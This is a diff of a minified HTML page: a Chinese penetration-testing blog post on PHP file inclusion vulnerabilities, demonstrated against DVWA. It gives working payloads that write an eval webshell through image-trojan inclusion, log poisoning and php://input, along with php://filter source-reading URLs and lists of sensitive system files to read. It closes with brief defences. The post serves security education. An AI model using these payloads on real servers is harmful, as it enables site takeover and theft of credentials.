@@ -1,203 +1,50 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>文件包含漏洞 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>文件包含漏洞</h1>
-      
-<div class="post-meta">
-    <time>2016-07-26</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>)
-</div>
-
-      <div><p>环境：phpStudy 2016、DVWA v1.10</p>
-<h3 id="0x00-文件包含">0x00 文件包含</h3>
-<p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</p>
-<p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
-<p>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。</p>
-<p>在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。</p>
-<h3 id="0x01-常见文件包含函数">0x01 常见文件包含函数</h3>
-<pre tabindex="0"><code>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>文件包含漏洞 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>文件包含漏洞</h1><div class=post-meta><time>2016-07-26</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB>文件包含</a>)</div><div><p>环境：phpStudy 2016、DVWA v1.10</p><h3 id=0x00-文件包含>0x00 文件包含</h3><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</p><p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><p>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。</p><p>在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。</p><h3 id=0x01-常见文件包含函数>0x01 常见文件包含函数</h3><pre tabindex=0><code>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
 include_once()和require_once()：若文件中代码已被包含则不会再次包含
-</code></pre><h3 id="0x02-利用条件">0x02 利用条件</h3>
-<ul>
-<li>程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件</li>
-<li>用户能够控制该动态变量</li>
-</ul>
-<pre tabindex="0"><code>注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析，  
+</code></pre><h3 id=0x02-利用条件>0x02 利用条件</h3><ul><li>程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件</li><li>用户能够控制该动态变量</li></ul><pre tabindex=0><code>注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析，  
    若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径
-</code></pre><h3 id="0x03-漏洞危害">0x03 漏洞危害</h3>
-<ul>
-<li>执行任意代码</li>
-<li>读取文件源码或敏感信息</li>
-<li>包含恶意文件控制网站</li>
-<li>甚至控制服务器</li>
-</ul>
-<h3 id="0x04-漏洞分类">0x04 漏洞分类</h3>
-<ul>
-<li>本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码
-<ul>
-<li>读敏感文件，读PHP文件</li>
-<li>包含日志文件GetShell</li>
-<li>上传图片马，然后包含从而GetShell</li>
-<li>包含/proc/self/envion文件GetShell</li>
-<li>包含data:或php://input等伪协议</li>
-<li>若有phpinfo则可以包含临时文件</li>
-</ul>
-</li>
-<li>远程文件包含：可以直接执行任意代码
-<ul>
-<li>要保证php.ini中allow_url_fopen和allow_url_include要为On</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x05-漏洞挖掘">0x05 漏洞挖掘</h3>
-<blockquote>
-<p>上AWVS或者自己写代码测试</p>
-</blockquote>
-<h3 id="0x06-本地包含getshell">0x06 本地包含GetShell</h3>
-<ul>
-<li>简单代码示例</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">@</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>]) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;./action/&#34;</span><span style="color:#f92672">.</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>]);
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;./action/show.php&#34;</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p><img src="/img/post/file_include_upload2.png" alt="文件包含-上传图片马">
-<img src="/img/post/file_include_upload2_check.png" alt="文件包含-验证能包含图片马"></p>
-<ul>
-<li>
-<p>包含图片马写shell</p>
-<ul>
-<li>生成包含<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST['cmd']);?&gt;&quot;)?&gt;</code>的图片马</li>
-<li>上传后图片路径为../../hackable/uploads/aa.png</li>
-<li>访问<code>http://10.11.11.20/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/aa.png</code></li>
-<li>在fi这个文件夹下会看到生成shell.php,内容为<code>&lt;?php eval($_POST['cmd']);?&gt;</code></li>
-</ul>
-</li>
-<li>
-<p>包含日志GetShell(主要是得到日志的路径)</p>
-</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">在Linux下一般读日志路径：</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">文件包含漏洞读取apache配置文件</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">index.php?page</span><span style="color:#f92672">=</span><span style="color:#e6db74">/etc/init.d/httpd</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">index.php?page</span><span style="color:#f92672">=</span><span style="color:#e6db74">/etc/httpd/conf/httpd.conf</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">默认位置/var/log/httpd/access_log</span>
-</span></span></code></pre></div><p>日志会记录客户端请求及服务器响应的信息，访问<code>http://www.xx.com/&lt;?php phpinfo(); ?&gt;</code>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent
-<img src="/img/post/file_include_access.log1.png" alt="文件包含-包含日志">
+</code></pre><h3 id=0x03-漏洞危害>0x03 漏洞危害</h3><ul><li>执行任意代码</li><li>读取文件源码或敏感信息</li><li>包含恶意文件控制网站</li><li>甚至控制服务器</li></ul><h3 id=0x04-漏洞分类>0x04 漏洞分类</h3><ul><li>本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码<ul><li>读敏感文件，读PHP文件</li><li>包含日志文件GetShell</li><li>上传图片马，然后包含从而GetShell</li><li>包含/proc/self/envion文件GetShell</li><li>包含data:或php://input等伪协议</li><li>若有phpinfo则可以包含临时文件</li></ul></li><li>远程文件包含：可以直接执行任意代码<ul><li>要保证php.ini中allow_url_fopen和allow_url_include要为On</li></ul></li></ul><h3 id=0x05-漏洞挖掘>0x05 漏洞挖掘</h3><blockquote><p>上AWVS或者自己写代码测试</p></blockquote><h3 id=0x06-本地包含getshell>0x06 本地包含GetShell</h3><ul><li>简单代码示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;page&#39;</span>]) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;./action/&#34;</span><span style=color:#f92672>.</span>$_GET[<span style=color:#e6db74>&#39;page&#39;</span>]);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;./action/show.php&#34;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p><img src=/img/post/file_include_upload2.png alt=文件包含-上传图片马>
+<img src=/img/post/file_include_upload2_check.png alt=文件包含-验证能包含图片马></p><ul><li><p>包含图片马写shell</p><ul><li>生成包含<code>&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval(\$_POST['cmd']);?>")?></code>的图片马</li><li>上传后图片路径为../../hackable/uploads/aa.png</li><li>访问<code>http://10.11.11.20/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/aa.png</code></li><li>在fi这个文件夹下会看到生成shell.php,内容为<code>&lt;?php eval($_POST['cmd']);?></code></li></ul></li><li><p>包含日志GetShell(主要是得到日志的路径)</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a6e22e>在Linux下一般读日志路径：</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>文件包含漏洞读取apache配置文件</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>index.php?page</span><span style=color:#f92672>=</span><span style=color:#e6db74>/etc/init.d/httpd</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>index.php?page</span><span style=color:#f92672>=</span><span style=color:#e6db74>/etc/httpd/conf/httpd.conf</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>默认位置/var/log/httpd/access_log</span>
+</span></span></code></pre></div><p>日志会记录客户端请求及服务器响应的信息，访问<code>http://www.xx.com/&lt;?php phpinfo(); ?></code>时，也会被记录在日志里，也可以插入到User-Agent
+<img src=/img/post/file_include_access.log1.png alt=文件包含-包含日志>
 可以通过Burp Suite来绕过编码
-<img src="/img/post/file_include_access.log2.png" alt="文件包含-包含日志">
+<img src=/img/post/file_include_access.log2.png alt=文件包含-包含日志>
 日志内容如下：
-<img src="/img/post/file_include_access.log3.png" alt="文件包含-包含日志">
-<img src="/img/post/file_include_access.log4.png" alt="文件包含-包含日志"></p>
-<ul>
-<li>使用PHP封装协议GetShell</li>
-</ul>
-<pre tabindex="0"><code>allow_url_include=On时：
+<img src=/img/post/file_include_access.log3.png alt=文件包含-包含日志>
+<img src=/img/post/file_include_access.log4.png alt=文件包含-包含日志></p><ul><li>使用PHP封装协议GetShell</li></ul><pre tabindex=0><code>allow_url_include=On时：
 
 http://www.xxx.com/index.php?page=php://input
 POST:&lt;?php fputs(fopen(&#34;shell.php&#34;,&#34;w&#34;),&#34;&lt;?php eval(\$_POST[&#39;cmd&#39;]);?&gt;&#34;) ?&gt;
 
 结果将在index.php所在文件下生成一句话文件shell.php
-</code></pre><ul>
-<li>%00截断包含(PHP&lt;5.3.4 and magic_quotes_gpc=Off，CVE-2006-7243)</li>
-</ul>
-<p><img src="/img/post/file_include_upload3.png" alt="文件包含-上传图片马"></p>
-<p>还有一个路径长度截断，可以用.或/.或./截断，Windows需要259个bytes，Linux需要4096个bytes</p>
-<ul>
-<li>phpinfo包含临时文件GetShell</li>
-</ul>
-<pre tabindex="0"><code>向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
+</code></pre><ul><li>%00截断包含(PHP&lt;5.3.4 and magic_quotes_gpc=Off，CVE-2006-7243)</li></ul><p><img src=/img/post/file_include_upload3.png alt=文件包含-上传图片马></p><p>还有一个路径长度截断，可以用.或/.或./截断，Windows需要259个bytes，Linux需要4096个bytes</p><ul><li>phpinfo包含临时文件GetShell</li></ul><pre tabindex=0><code>向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
 可以用程序持续上传，然后就可以包含你上传的文件了
-</code></pre><ul>
-<li>包含环境变量文件GetShell</li>
-</ul>
-<pre tabindex="0"><code>需要PHP运行在CGI模式
+</code></pre><ul><li>包含环境变量文件GetShell</li></ul><pre tabindex=0><code>需要PHP运行在CGI模式
 然后和包含日志一样，在User-Agent修改为payload
-</code></pre><h3 id="0x07-本地包含读文件">0x07 本地包含读文件</h3>
-<ul>
-<li>读敏感文件</li>
-</ul>
-<p><img src="/img/post/file_include_read_file.png" alt="文件包含-读敏感文件"></p>
-<p>可读如下敏感文件：</p>
-<pre tabindex="0"><code>Windows：
+</code></pre><h3 id=0x07-本地包含读文件>0x07 本地包含读文件</h3><ul><li>读敏感文件</li></ul><p><img src=/img/post/file_include_read_file.png alt=文件包含-读敏感文件></p><p>可读如下敏感文件：</p><pre tabindex=0><code>Windows：
     C:\boot.ini  //查看系统版本
     C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
     C:\Windows\repair\sam  //存储系统初次安装的密码
@@ -220,49 +67,20 @@ Linux：
     /proc/self/fd/fd[0-9]*(文件标识符)
     /proc/mounts
     /porc/config.gz
-</code></pre><ul>
-<li>读PHP文件源码</li>
-</ul>
-<pre tabindex="0"><code>直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
+</code></pre><ul><li>读PHP文件源码</li></ul><pre tabindex=0><code>直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
 ?page=php://filter/read=convert.base64-encode/resource=config.php
 访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码
-</code></pre><h3 id="0x08-远程包含">0x08 远程包含</h3>
-<p>注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
-<img src="/img/post/file_include_remote_include.png" alt="文件包含-远程包含">
-若在a.txt写入<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST['cmd']); ?&gt;&quot;) ?&gt;</code>，可直接写shell</p>
-<h3 id="0x09-漏洞防御">0x09 漏洞防御</h3>
-<pre tabindex="0"><code>PHP中使用open_basedir配置，将访问限制在指定区域
+</code></pre><h3 id=0x08-远程包含>0x08 远程包含</h3><p>注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
+<img src=/img/post/file_include_remote_include.png alt=文件包含-远程包含>
+若在a.txt写入<code>&lt;?php fputs(fopen("shell.php","w"),"&lt;?php @eval($_POST['cmd']); ?>") ?></code>，可直接写shell</p><h3 id=0x09-漏洞防御>0x09 漏洞防御</h3><pre tabindex=0><code>PHP中使用open_basedir配置，将访问限制在指定区域
 过滤./\
 禁止服务器远程文件包含
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
